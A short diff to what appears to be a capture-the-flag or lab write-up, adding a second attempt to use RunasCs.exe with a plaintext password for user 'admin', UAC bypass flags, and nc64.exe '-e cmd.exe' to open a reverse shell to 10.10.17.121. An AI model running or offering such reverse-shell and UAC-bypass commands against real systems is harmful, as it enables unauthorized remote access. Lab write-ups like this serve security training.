@@ -185,3 +185,7 @@ This compiler is provided as part of the Microsoft (R) .NET Framework, but only 
 PS C:\temp> .\RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.17.121 1234 -e cmd.exe"
 [*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 ```
+```
+PS C:\temp> .\RunasCs.exe admin Twisting3021 --bypass-uac --logon-type 8  "C:\temp\nc64.exe 10.10.17.121 1235 -e cmd.exe"
+invalid port e: NO_DATA
+```
